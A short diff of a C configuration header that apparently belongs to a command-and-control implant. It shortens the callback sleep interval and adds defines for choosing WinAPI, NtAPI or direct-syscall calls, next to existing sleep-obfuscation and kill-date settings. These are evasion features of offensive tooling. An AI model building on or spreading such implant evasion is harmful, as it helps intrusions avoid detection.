@@ -10,13 +10,20 @@
 #define CONFIG_SECURE     FALSE
 #define CONFIG_WRKHRS     NULL
 #define CONFIG_KILLDATE   NULL
-#define CONFIG_SLEEP      8
+#define CONFIG_SLEEP      1
 
 #ifndef _BK_SLEEP_OBF_
 #define _BK_SLEEP_OBF_ 0  
 #endif
 #define _BK_SLEEP_TIMER_   0x1030
 #define _BK_SLEEP_APC_     0x2030
+
+#ifndef _BK_API_
+#define _BK_API_ 0x1030
+#endif
+#define _BK_API_WINAPI_  0x1030
+#define _BK_API_NTAPI_   0x2030
+#define _BK_API_SYSCALL_ 0x3030
 
 //
 // Hashing defines
